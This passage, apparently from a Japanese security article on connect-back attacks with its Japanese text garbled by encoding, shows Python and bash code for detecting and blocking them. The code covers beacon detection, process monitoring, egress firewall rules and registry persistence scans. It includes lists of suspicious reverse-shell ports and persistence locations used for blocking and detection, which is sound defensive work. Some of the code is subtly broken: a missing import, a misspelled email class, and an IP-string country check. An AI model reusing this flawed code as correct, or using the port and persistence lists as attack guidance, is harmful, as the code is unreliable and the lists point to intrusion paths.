        # ãƒ“ãƒ¼ã‚³ãƒ³é€šä¿¡ã®æ¤œçŸ¥
        intervals = []
        for i in range(1, len(connections)):
            interval = connections[i] - connections[i-1]
            intervals.append(interval)
        
        # å®šæœŸçš„ãªé€šä¿¡ãƒ‘ã‚¿ãƒ¼ãƒ³ã®æ¤œçŸ¥
        if len(intervals) >= 3:
            avg_interval = sum(intervals) / len(intervals)
            variance = sum((x - avg_interval) ** 2 for x in intervals) / len(intervals)
            
            # åˆ†æ•£ãŒå°ã•ã„å ´åˆã€å®šæœŸçš„ãªé€šä¿¡ã¨åˆ¤å®š
            if variance < 10 and avg_interval < 300:  # 5åˆ†ä»¥ä¸‹ã®é–“éš”
                self.alert(f"Possible beacon communication detected: {connection_key} (interval: {avg_interval:.1f}s)")
        
        # é«˜é »åº¦æ¥ç¶šã®æ¤œçŸ¥
        recent_connections = [t for t in connections if time.time() - t < 60]  # ç›´è¿‘1åˆ†
        if len(recent_connections) > self.rules['connection_frequency_threshold']:
            self.alert(f"High frequency connections detected: {connection_key} ({len(recent_connections)} connections/min)")
    
    def alert(self, message):
        """ã‚¢ãƒ©ãƒ¼ãƒˆå‡ºåŠ›"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{timestamp}] ALERT: {message}")
        
        # ãƒ­ã‚°ãƒ•ã‚¡ã‚¤ãƒ«ã«è¨˜éŒ²
        with open('connectback_alerts.log', 'a') as f:
            f.write(f"[{timestamp}] {message}\n")
    
    def start_monitoring(self, interface='eth0'):
        """ç›£è¦–é–‹å§‹"""
        print(f"Starting connect-back detection on interface {interface}")
        self.monitoring = True
        
        # ãƒ‘ã‚±ãƒƒãƒˆã‚­ãƒ£ãƒ—ãƒãƒ£é–‹å§‹
        scapy.sniff(
            iface=interface,
            prn=self.analyze_packet,
            filter="tcp",
            stop_filter=lambda x: not self.monitoring
        )
    
    def stop_monitoring(self):
        """ç›£è¦–åœæ­¢"""
        self.monitoring = False
        print("Connect-back detection stopped")

# ä½¿ç”¨ä¾‹
detector = ConnectBackDetector()
# detector.start_monitoring('eth0')
```

### 2. ãƒ—ãƒ­ã‚»ã‚¹ç›£è¦–ã«ã‚ˆã‚‹æ¤œçŸ¥

```python
# ãƒ—ãƒ­ã‚»ã‚¹ç•°å¸¸ç›£è¦–ã‚¹ã‚¯ãƒªãƒ—ãƒˆ
import psutil
import time
import socket
import threading
from collections import defaultdict

class ProcessConnectionMonitor:
    def __init__(self):
        self.known_processes = set()
        self.suspicious_connections = []
        self.monitoring = False
        
        # ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆ
        self.whitelist_processes = {
            'chrome.exe', 'firefox.exe', 'outlook.exe', 
            'teams.exe', 'skype.exe', 'zoom.exe'
        }
        
        # æ€ªã—ã„ãƒãƒ¼ãƒˆ
        self.suspicious_ports = {4444, 5555, 6666, 7777, 8888, 9999}
    
    def get_process_connections(self):
        """ãƒ—ãƒ­ã‚»ã‚¹ã®æ¥ç¶šæƒ…å ±ã‚’å–å¾—"""
        connections = []
        
        for proc in psutil.process_iter(['pid', 'name', 'connections']):
            try:
                proc_info = proc.info
                if proc_info['connections']:
                    for conn in proc_info['connections']:
                        if conn.status == 'ESTABLISHED' and conn.raddr:
                            connections.append({
                                'pid': proc_info['pid'],
                                'name': proc_info['name'],
                                'local_addr': conn.laddr,
                                'remote_addr': conn.raddr,
                                'status': conn.status
                            })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                continue
        
        return connections
    
    def analyze_connections(self, connections):
        """æ¥ç¶šã®åˆ†æ"""
        for conn in connections:
            # å¤–å‘ãæ¥ç¶šã®ãƒã‚§ãƒƒã‚¯
            if self.is_outbound_connection(conn):
                self.check_suspicious_connection(conn)
    
    def is_outbound_connection(self, conn):
        """å¤–å‘ãæ¥ç¶šã®åˆ¤å®š"""
        local_ip = conn['local_addr'].ip
        remote_ip = conn['remote_addr'].ip
        
        # å†…éƒ¨IPã‹ã‚‰å¤–éƒ¨IPã¸ã®æ¥ç¶š
        return (self.is_internal_ip(local_ip) and 
                not self.is_internal_ip(remote_ip))
    
    def is_internal_ip(self, ip):
        """å†…éƒ¨IPã®åˆ¤å®š"""
        try:
            import ipaddress
            addr = ipaddress.ip_address(ip)
            return addr.is_private
        except:
            return False
    
    def check_suspicious_connection(self, conn):
        """æ€ªã—ã„æ¥ç¶šã®ãƒã‚§ãƒƒã‚¯"""
        process_name = conn['name'].lower()
        remote_port = conn['remote_addr'].port
        
        # ãƒ›ãƒ¯ã‚¤ãƒˆãƒªã‚¹ãƒˆãƒ—ãƒ­ã‚»ã‚¹ã¯é™¤å¤–
        if process_name in self.whitelist_processes:
            return
        
        # æ€ªã—ã„ãƒãƒ¼ãƒˆã¸ã®æ¥ç¶š
        if remote_port in self.suspicious_ports:
            self.alert(f"Suspicious port connection: {process_name} (PID: {conn['pid']}) -> {conn['remote_addr'].ip}:{remote_port}")
        
        # æœªçŸ¥ã®ãƒ—ãƒ­ã‚»ã‚¹ã®å¤–å‘ãæ¥ç¶š
        if process_name not in self.known_processes:
            self.alert(f"Unknown process outbound connection: {process_name} (PID: {conn['pid']}) -> {conn['remote_addr'].ip}:{remote_port}")
            self.known_processes.add(process_name)
        
        # ã‚·ã‚¹ãƒ†ãƒ ãƒ—ãƒ­ã‚»ã‚¹ã®ç•°å¸¸ãªæ¥ç¶š
        system_processes = ['svchost.exe', 'lsass.exe', 'winlogon.exe']
        if any(sys_proc in process_name for sys_proc in system_processes):
            self.alert(f"System process suspicious connection: {process_name} (PID: {conn['pid']}) -> {conn['remote_addr'].ip}:{remote_port}")
    
    def alert(self, message):
        """ã‚¢ãƒ©ãƒ¼ãƒˆ"""
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        alert_msg = f"[{timestamp}] PROCESS ALERT: {message}"
        print(alert_msg)
        
        with open('process_connection_alerts.log', 'a') as f:
            f.write(alert_msg + '\n')
    
    def monitor_loop(self):
        """ç›£è¦–ãƒ«ãƒ¼ãƒ—"""
        while self.monitoring:
            try:
                connections = self.get_process_connections()
                self.analyze_connections(connections)
                time.sleep(10)  # 10ç§’é–“éš”ã§ç›£è¦–
            except Exception as e:
                print(f"Monitoring error: {e}")
                time.sleep(30)
    
    def start_monitoring(self):
        """ç›£è¦–é–‹å§‹"""
        print("Starting process connection monitoring...")
        self.monitoring = True
        
        monitor_thread = threading.Thread(target=self.monitor_loop)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        return monitor_thread
    
    def stop_monitoring(self):
        """ç›£è¦–åœæ­¢"""
        print("Stopping process connection monitoring...")
        self.monitoring = False

# ä½¿ç”¨ä¾‹
monitor = ProcessConnectionMonitor()
# thread = monitor.start_monitoring()
# time.sleep(300)  # 5åˆ†é–“ç›£è¦–
# monitor.stop_monitoring()
```

## æ­£å½“ãªç”¨é€”

### 1. ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒãƒ¼ãƒˆ

```
ğŸ”§ æ­£å½“ãªã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ç”¨é€”

ãƒªãƒ¢ãƒ¼ãƒˆã‚µãƒãƒ¼ãƒˆãƒ„ãƒ¼ãƒ«:
- TeamViewer
- Chrome Remote Desktop
- Windows Remote Assistance
- VNC (Virtual Network Computing)

ç‰¹å¾´:
âœ… ãƒ¦ãƒ¼ã‚¶ãƒ¼ã®æ˜ç¤ºçš„ãªåŒæ„
âœ… ä¸€æ™‚çš„ãªæ¥ç¶š
âœ… æš—å·åŒ–é€šä¿¡
âœ… æ¥ç¶šçŠ¶æ…‹ã®å¯è¦–åŒ–
âœ… ç°¡å˜ãªåˆ‡æ–­æ©Ÿèƒ½
```

### 2. IoTãƒ‡ãƒã‚¤ã‚¹ç®¡ç†

```python
# IoTãƒ‡ãƒã‚¤ã‚¹ã®æ­£å½“ãªã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ä¾‹
import json
import time
import ssl
import socket
from datetime import datetime

class IoTDeviceManager:
    def __init__(self, device_id, management_server):
        self.device_id = device_id
        self.management_server = management_server
        self.ssl_context = ssl.create_default_context()
        self.connected = False
    
    def connect_to_management_server(self):
        """ç®¡ç†ã‚µãƒ¼ãƒãƒ¼ã¸ã®å®‰å…¨ãªæ¥ç¶š"""
        try:
            # SSL/TLSæ¥ç¶šã®ç¢ºç«‹
            sock = socket.create_connection(
                (self.management_server['host'], self.management_server['port']),
                timeout=30
            )
            
            self.ssl_sock = self.ssl_context.wrap_socket(
                sock, 
                server_hostname=self.management_server['host']
            )
            
            # ãƒ‡ãƒã‚¤ã‚¹èªè¨¼
            auth_data = {
                'device_id': self.device_id,
                'timestamp': datetime.now().isoformat(),
                'version': '1.0'
            }
            
            self.ssl_sock.send(json.dumps(auth_data).encode())
            response = json.loads(self.ssl_sock.recv(1024).decode())
            
            if response.get('status') == 'authenticated':
                self.connected = True
                print(f"Device {self.device_id} connected to management server")
                return True
            
        except Exception as e:
            print(f"Connection failed: {e}")
            return False
    
    def handle_management_commands(self):
        """ç®¡ç†ã‚³ãƒãƒ³ãƒ‰ã®å‡¦ç†"""
        while self.connected:
            try:
                data = self.ssl_sock.recv(1024).decode()
                if not data:
                    break
                
                command = json.loads(data)
                response = self.process_command(command)
                
                self.ssl_sock.send(json.dumps(response).encode())
                
            except Exception as e:
                print(f"Command handling error: {e}")
                break
    
    def process_command(self, command):
        """ã‚³ãƒãƒ³ãƒ‰å‡¦ç†ï¼ˆåˆ¶é™ã•ã‚ŒãŸæ“ä½œã®ã¿ï¼‰"""
        cmd_type = command.get('type')
        
        if cmd_type == 'status':
            return {
                'device_id': self.device_id,
                'status': 'online',
                'timestamp': datetime.now().isoformat()
            }
        
        elif cmd_type == 'update_config':
            # è¨­å®šæ›´æ–°ï¼ˆå®‰å…¨ãªç¯„å›²ã®ã¿ï¼‰
            config = command.get('config', {})
            # è¨­å®šã®æ¤œè¨¼ã¨é©ç”¨
            return {'status': 'config_updated'}
        
        elif cmd_type == 'reboot':
            # å†èµ·å‹•ï¼ˆç®¡ç†è€…æ¨©é™ãŒå¿…è¦ï¼‰
            return {'status': 'reboot_scheduled'}
        
        else:
            return {'status': 'unknown_command'}

# IoTãƒ‡ãƒã‚¤ã‚¹ç®¡ç†ã®ä¾‹
# device = IoTDeviceManager('device_001', {'host': 'iot-management.company.com', 'port': 443})
# if device.connect_to_management_server():
#     device.handle_management_commands()
```

### 3. ä¼æ¥­å†…ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†

```
ğŸ¢ ä¼æ¥­å†…ã§ã®æ­£å½“ãªä½¿ç”¨ä¾‹

ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†ç”¨é€”:
- è³‡ç”£ç®¡ç†ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ
- ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢é…å¸ƒã‚·ã‚¹ãƒ†ãƒ 
- ãƒ‘ãƒƒãƒç®¡ç†ã‚·ã‚¹ãƒ†ãƒ 
- ç›£è¦–ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆ

ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£è¦ä»¶:
âœ… ä¼æ¥­å†…èªè¨¼å±€ã«ã‚ˆã‚‹è¨¼æ˜æ›¸
âœ… ç›¸äº’èªè¨¼
âœ… æš—å·åŒ–é€šä¿¡
âœ… ãƒ­ã‚°è¨˜éŒ²
âœ… ã‚¢ã‚¯ã‚»ã‚¹åˆ¶å¾¡
âœ… å®šæœŸçš„ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£ç›£æŸ»
```

## é˜²å¾¡ç­–

### 1. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ãƒ¬ãƒ™ãƒ«ã®å¯¾ç­–

```
ğŸ›¡ï¸ ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯é˜²å¾¡ç­–

1. å¤–å‘ããƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«è¨­å®š
   - ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆæ‹’å¦ãƒãƒªã‚·ãƒ¼
   - å¿…è¦ãªé€šä¿¡ã®ã¿è¨±å¯
   - ç•°å¸¸ãªãƒãƒ¼ãƒˆã®ãƒ–ãƒ­ãƒƒã‚¯
   - åœ°ç†çš„ãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°

2. ãƒ—ãƒ­ã‚­ã‚·ã‚µãƒ¼ãƒãƒ¼ã®æ´»ç”¨
   - å…¨HTTP/HTTPSé€šä¿¡ã®ä¸­ç¶™
   - URLãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°
   - é€šä¿¡å†…å®¹ã®æ¤œæŸ»
   - ãƒ­ã‚°è¨˜éŒ²ãƒ»åˆ†æ

3. DNSãƒ•ã‚£ãƒ«ã‚¿ãƒªãƒ³ã‚°
   - æ‚ªæ„ã®ã‚ã‚‹ãƒ‰ãƒ¡ã‚¤ãƒ³ã®ãƒ–ãƒ­ãƒƒã‚¯
   - DNS over HTTPSã®åˆ¶å¾¡
   - å†…éƒ¨DNSè§£æ±ºã®å¼·åˆ¶
   - ç•°å¸¸ãªDNSã‚¯ã‚¨ãƒªã®æ¤œçŸ¥

4. ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯åˆ†é›¢
   - VLANåˆ†é›¢
   - ãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³
   - ã‚¼ãƒ­ãƒˆãƒ©ã‚¹ãƒˆãƒãƒƒãƒˆãƒ¯ãƒ¼ã‚¯
   - ãƒã‚¤ã‚¯ãƒ­ã‚»ã‚°ãƒ¡ãƒ³ãƒ†ãƒ¼ã‚·ãƒ§ãƒ³
```

#### ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«è¨­å®šä¾‹

```bash
#!/bin/bash
# å¤–å‘ããƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«è¨­å®šä¾‹

# ãƒ‡ãƒ•ã‚©ãƒ«ãƒˆãƒãƒªã‚·ãƒ¼ï¼ˆå…¨ã¦æ‹’å¦ï¼‰
iptables -P OUTPUT DROP

# å¿…è¦ãªå¤–å‘ãé€šä¿¡ã®ã¿è¨±å¯
# DNS (53/tcp, 53/udp)
iptables -A OUTPUT -p tcp --dport 53 -j ACCEPT
iptables -A OUTPUT -p udp --dport 53 -j ACCEPT

# HTTP/HTTPS (80/tcp, 443/tcp)
iptables -A OUTPUT -p tcp --dport 80 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT

# ãƒ¡ãƒ¼ãƒ« (25/tcp, 587/tcp, 993/tcp)
iptables -A OUTPUT -p tcp --dport 25 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 587 -j ACCEPT
iptables -A OUTPUT -p tcp --dport 993 -j ACCEPT

# NTP (123/udp)
iptables -A OUTPUT -p udp --dport 123 -j ACCEPT

# æ€ªã—ã„ãƒãƒ¼ãƒˆã®æ˜ç¤ºçš„æ‹’å¦ï¼†ãƒ­ã‚°
SUSPICIOUS_PORTS="4444 5555 6666 7777 8888 9999"
for port in $SUSPICIOUS_PORTS; do
    iptables -A OUTPUT -p tcp --dport $port -j LOG --log-prefix "BLOCKED_SUSPICIOUS_PORT: "
    iptables -A OUTPUT -p tcp --dport $port -j DROP
done

# å†…éƒ¨é€šä¿¡ã¯è¨±å¯
iptables -A OUTPUT -d 192.168.0.0/16 -j ACCEPT
iptables -A OUTPUT -d 10.0.0.0/8 -j ACCEPT
iptables -A OUTPUT -d 172.16.0.0/12 -j ACCEPT

# ãƒ«ãƒ¼ãƒ—ãƒãƒƒã‚¯è¨±å¯
iptables -A OUTPUT -o lo -j ACCEPT

# ç¢ºç«‹æ¸ˆã¿æ¥ç¶šã®å¿œç­”è¨±å¯
iptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
```

### 2. ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆå¯¾ç­–

```python
# ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆä¿è­·ã‚¹ã‚¯ãƒªãƒ—ãƒˆ
import os
import sys
import winreg
import subprocess
from pathlib import Path

class EndpointProtection:
    def __init__(self):
        self.suspicious_locations = [
            r"C:\Windows\Temp",
            r"C:\Users\Public",
            r"%APPDATA%\Roaming",
            r"%TEMP%",
            r"C:\ProgramData"
        ]
        
        self.suspicious_registry_keys = [
            r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run",
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
            r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce"
        ]
    
    def scan_suspicious_files(self):
        """æ€ªã—ã„ãƒ•ã‚¡ã‚¤ãƒ«ã®ã‚¹ã‚­ãƒ£ãƒ³"""
        suspicious_files = []
        
        for location in self.suspicious_locations:
            expanded_path = os.path.expandvars(location)
            if os.path.exists(expanded_path):
                for root, dirs, files in os.walk(expanded_path):
                    for file in files:
                        file_path = os.path.join(root, file)
                        
                        # å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ã‹ã¤æœ€è¿‘ä½œæˆã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«
                        if (file.endswith(('.exe', '.bat', '.cmd', '.scr', '.pif')) and
                            self.is_recently_created(file_path)):
                            suspicious_files.append(file_path)
        
        return suspicious_files
    
    def is_recently_created(self, file_path, days=7):
        """æœ€è¿‘ä½œæˆã•ã‚ŒãŸãƒ•ã‚¡ã‚¤ãƒ«ã‹ãƒã‚§ãƒƒã‚¯"""
        try:
            creation_time = os.path.getctime(file_path)
            current_time = time.time()
            return (current_time - creation_time) < (days * 24 * 3600)
        except:
            return False
    
    def scan_registry_persistence(self):
        """ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã®æ°¸ç¶šåŒ–ãƒã‚§ãƒƒã‚¯"""
        suspicious_entries = []
        
        for reg_path in self.suspicious_registry_keys:
            try:
                if "HKEY_CURRENT_USER" in reg_path:
                    root_key = winreg.HKEY_CURRENT_USER
                    sub_key = reg_path.replace("HKEY_CURRENT_USER\\", "")
                else:
                    root_key = winreg.HKEY_LOCAL_MACHINE
                    sub_key = reg_path.replace("HKEY_LOCAL_MACHINE\\", "")
                
                with winreg.OpenKey(root_key, sub_key) as key:
                    i = 0
                    while True:
                        try:
                            name, value, _ = winreg.EnumValue(key, i)
                            
                            # æ€ªã—ã„ãƒ‘ã‚¹ã‚„åå‰ã‚’ãƒã‚§ãƒƒã‚¯
                            if self.is_suspicious_registry_entry(name, value):
                                suspicious_entries.append({
                                    'registry_path': reg_path,
                                    'name': name,
                                    'value': value
                                })
                            
                            i += 1
                        except WindowsError:
                            break
                            
            except Exception as e:
                print(f"Registry scan error: {e}")
        
        return suspicious_entries
    
    def is_suspicious_registry_entry(self, name, value):
        """æ€ªã—ã„ãƒ¬ã‚¸ã‚¹ãƒˆãƒªã‚¨ãƒ³ãƒˆãƒªã®åˆ¤å®š"""
        suspicious_patterns = [
            'temp', 'tmp', 'appdata', 'roaming', 'public',
            'svchost', 'winlogon', 'explorer', 'system32'
        ]
        
        value_lower = str(value).lower()
        name_lower = str(name).lower()
        
        # æ€ªã—ã„ãƒ‘ã‚¹ãƒ‘ã‚¿ãƒ¼ãƒ³
        for pattern in suspicious_patterns:
            if pattern in value_lower or pattern in name_lower:
                return True
        
        # å®Ÿè¡Œãƒ•ã‚¡ã‚¤ãƒ«ãŒæ€ªã—ã„å ´æ‰€ã«ã‚ã‚‹
        if any(loc.lower() in value_lower for loc in self.suspicious_locations):
            return True
        
        return False
    
    def block_suspicious_outbound(self):
        """æ€ªã—ã„å¤–å‘ãé€šä¿¡ã®ãƒ–ãƒ­ãƒƒã‚¯"""
        suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999]
        
        for port in suspicious_ports:
            try:
                # Windows Firewallãƒ«ãƒ¼ãƒ«ã®è¿½åŠ 
                cmd = f'netsh advfirewall firewall add rule name="Block_Outbound_{port}" dir=out action=block protocol=TCP localport={port}'
                subprocess.run(cmd, shell=True, check=True)
                print(f"Blocked outbound connections to port {port}")
            except subprocess.CalledProcessError as e:
                print(f"Failed to block port {port}: {e}")
    
    def generate_report(self):
        """ä¿è­·ãƒ¬ãƒãƒ¼ãƒˆã®ç”Ÿæˆ"""
        report = {
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
            'suspicious_files': self.scan_suspicious_files(),
            'registry_entries': self.scan_registry_persistence()
        }
        
        return report

# ä½¿ç”¨ä¾‹
# protection = EndpointProtection()
# report = protection.generate_report()
# print(json.dumps(report, indent=2))
```

## ç›£è¦–ã¨åˆ†æ

### 1. çµ±åˆç›£è¦–ã‚·ã‚¹ãƒ†ãƒ 

```python
# çµ±åˆã‚³ãƒã‚¯ãƒˆãƒãƒƒã‚¯ç›£è¦–ã‚·ã‚¹ãƒ†ãƒ 
import json
import time
import sqlite3
from datetime import datetime, timedelta
import threading
import smtplib
from email.mime.text import MimeText

class ConnectBackMonitoringSystem:
    def __init__(self, db_path='connectback_monitor.db'):
        self.db_path = db_path
        self.init_database()
        self.monitoring = False
        self.alert_threshold = {
            'connection_frequency': 10,  # 10å›/åˆ†
            'beacon_regularity': 0.1,    # åˆ†æ•£ã®é–¾å€¤
            'suspicious_port_count': 3   # æ€ªã—ã„ãƒãƒ¼ãƒˆä½¿ç”¨å›æ•°
        }
    
    def init_database(self):
        """ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹åˆæœŸåŒ–"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # æ¥ç¶šãƒ­ã‚°ãƒ†ãƒ¼ãƒ–ãƒ«
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS connections (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME NOT NULL,
                src_ip TEXT NOT NULL,
                dst_ip TEXT NOT NULL,
                dst_port INTEGER NOT NULL,
                protocol TEXT NOT NULL,
                process_name TEXT,
                process_pid INTEGER,
                connection_type TEXT,
                risk_score INTEGER DEFAULT 0
            )
        ''')
        
        # ã‚¢ãƒ©ãƒ¼ãƒˆãƒ†ãƒ¼ãƒ–ãƒ«
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS alerts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp DATETIME NOT NULL,
                alert_type TEXT NOT NULL,
                severity TEXT NOT NULL,
                description TEXT NOT NULL,
                source_data TEXT,
                acknowledged BOOLEAN DEFAULT 0
            )
        ''')
        
        conn.commit()
        conn.close()
    
    def log_connection(self, src_ip, dst_ip, dst_port, protocol, 
                      process_name=None, process_pid=None):
        """æ¥ç¶šãƒ­ã‚°ã®è¨˜éŒ²"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # ãƒªã‚¹ã‚¯ã‚¹ã‚³ã‚¢ã®è¨ˆç®—
        risk_score = self.calculate_risk_score(dst_ip, dst_port, process_name)
        
        # æ¥ç¶šã‚¿ã‚¤ãƒ—ã®åˆ¤å®š
        connection_type = self.classify_connection(dst_ip, dst_port, process_name)
        
        cursor.execute('''
            INSERT INTO connections 
            (timestamp, src_ip, dst_ip, dst_port, protocol, process_name, 
             process_pid, connection_type, risk_score)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (datetime.now(), src_ip, dst_ip, dst_port, protocol,
              process_name, process_pid, connection_type, risk_score))
        
        conn.commit()
        conn.close()
        
        # é«˜ãƒªã‚¹ã‚¯æ¥ç¶šã®å ´åˆã¯ã‚¢ãƒ©ãƒ¼ãƒˆ
        if risk_score >= 70:
            self.create_alert('high_risk_connection', 'HIGH',
                            f'High risk outbound connection: {src_ip} -> {dst_ip}:{dst_port}',
                            {'src_ip': src_ip, 'dst_ip': dst_ip, 'dst_port': dst_port, 'risk_score': risk_score})
    
    def calculate_risk_score(self, dst_ip, dst_port, process_name):
        """ãƒªã‚¹ã‚¯ã‚¹ã‚³ã‚¢ã®è¨ˆç®—"""
        score = 0
        
        # æ€ªã—ã„ãƒãƒ¼ãƒˆ
        suspicious_ports = [4444, 5555, 6666, 7777, 8888, 9999]
        if dst_port in suspicious_ports:
            score += 40
        
        # æœªçŸ¥ã®ãƒ—ãƒ­ã‚»ã‚¹
        known_processes = ['chrome.exe', 'firefox.exe', 'outlook.exe', 'teams.exe']
        if process_name and process_name.lower() not in known_processes:
            score += 20
        
        # åœ°ç†çš„ãƒªã‚¹ã‚¯ï¼ˆç°¡æ˜“ç‰ˆï¼‰
        high_risk_countries = ['CN', 'RU', 'KP']  # å®Ÿéš›ã¯åœ°ç†çš„IPãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã‚’ä½¿ç”¨
        # ã“ã“ã§ã¯ç°¡æ˜“çš„ãªåˆ¤å®š
        if any(country in str(dst_ip) for country in high_risk_countries):
            score += 30
        
        # éæ¨™æº–ãƒãƒ¼ãƒˆ
        standard_ports = [80, 443, 25, 587, 993, 995, 110, 143, 53, 123]
        if dst_port not in standard_ports:
            score += 10
        
        return min(score, 100)  # æœ€å¤§100ç‚¹
    
    def classify_connection(self, dst_ip, dst_port, process_name):
        """æ¥ç¶šã‚¿ã‚¤ãƒ—ã®åˆ†é¡"""
        if dst_port in [80, 443]:
            return 'web_browsing'
        elif dst_port in [25, 587, 993, 995, 110, 143]:
            return 'email'
        elif dst_port == 53:
            return 'dns'
        elif dst_port in [4444, 5555, 6666, 7777, 8888, 9999]:
            return 'suspicious_port'
        else:
            return 'other'
    
    def analyze_beacon_pattern(self):
        """ãƒ“ãƒ¼ã‚³ãƒ³é€šä¿¡ãƒ‘ã‚¿ãƒ¼ãƒ³ã®åˆ†æ"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # éå»1æ™‚é–“ã®æ¥ç¶šãƒ‡ãƒ¼ã‚¿ã‚’å–å¾—
        cutoff_time = datetime.now() - timedelta(hours=1)
        
        cursor.execute('''
            SELECT src_ip, dst_ip, dst_port, COUNT(*) as count,
                   GROUP_CONCAT(timestamp) as timestamps
            FROM connections
            WHERE timestamp > ? AND connection_type != 'web_browsing'
            GROUP BY src_ip, dst_ip, dst_port
            HAVING count >= 5
        ''', (cutoff_time,))
        
        results = cursor.fetchall()
        conn.close()
        
        for row in results:
            src_ip, dst_ip, dst_port, count, timestamps_str = row
            timestamps = [datetime.fromisoformat(ts) for ts in timestamps_str.split(',')]
            
            # é–“éš”ã®è¨ˆç®—
            intervals = []
            for i in range(1, len(timestamps)):
                interval = (timestamps[i] - timestamps[i-1]).total_seconds()
                intervals.append(interval)
            
            if len(intervals) >= 3:
                # å¹³å‡é–“éš”ã¨åˆ†æ•£ã®è¨ˆç®—
                avg_interval = sum(intervals) / len(intervals)
                variance = sum((x - avg_interval) ** 2 for x in intervals) / len(intervals)
                
                # å®šæœŸçš„ãªé€šä¿¡ãƒ‘ã‚¿ãƒ¼ãƒ³ã®æ¤œçŸ¥
                if variance < self.alert_threshold['beacon_regularity'] * avg_interval:
                    self.create_alert('beacon_detected', 'MEDIUM',
                                    f'Beacon pattern detected: {src_ip} -> {dst_ip}:{dst_port} '
                                    f'(interval: {avg_interval:.1f}s, count: {count})',
                                    {'src_ip': src_ip, 'dst_ip': dst_ip, 'dst_port': dst_port,
                                     'avg_interval': avg_interval, 'count': count})
    
    def create_alert(self, alert_type, severity, description, source_data=None):
        """ã‚¢ãƒ©ãƒ¼ãƒˆã®ä½œæˆ"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO alerts (timestamp, alert_type, severity, description, source_data)
            VALUES (?, ?, ?, ?, ?)
        ''', (datetime.now(), alert_type, severity, description,
              json.dumps(source_data) if source_data else None))
        
        conn.commit()
        conn.close()
        
        # é‡è¦åº¦ãŒé«˜ã„å ´åˆã¯å³åº§ã«é€šçŸ¥
        if severity in ['HIGH', 'CRITICAL']:
            self.send_notification(alert_type, severity, description)
    
    def send_notification(self, alert_type, severity, description):
        """é€šçŸ¥ã®é€ä¿¡"""
        print(f"[{severity}] {alert_type}: {description}")
        
        # ãƒ¡ãƒ¼ãƒ«é€šçŸ¥ï¼ˆè¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰
        # self.send_email_alert(alert_type, severity, description)
        
        # Slacké€šçŸ¥ï¼ˆè¨­å®šã•ã‚Œã¦ã„ã‚‹å ´åˆï¼‰
        # self.send_slack_alert(alert_type, severity, description)
    
    def generate_daily_report(self):
        """æ—¥æ¬¡ãƒ¬ãƒãƒ¼ãƒˆã®ç”Ÿæˆ"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # éå»24æ™‚é–“ã®ãƒ‡ãƒ¼ã‚¿
        cutoff_time = datetime.now() - timedelta(days=1)
        
        # æ¥ç¶šçµ±è¨ˆ
        cursor.execute('''
            SELECT connection_type, COUNT(*) as count
            FROM connections
            WHERE timestamp > ?
            GROUP BY connection_type
        ''', (cutoff_time,))
        
        connection_stats = dict(cursor.fetchall())
        
        # ã‚¢ãƒ©ãƒ¼ãƒˆçµ±è¨ˆ
        cursor.execute('''
            SELECT alert_type, severity, COUNT(*) as count
            FROM alerts
            WHERE timestamp > ?
            GROUP BY alert_type, severity
        ''', (cutoff_time,))
        
        alert_stats = cursor.fetchall()
        
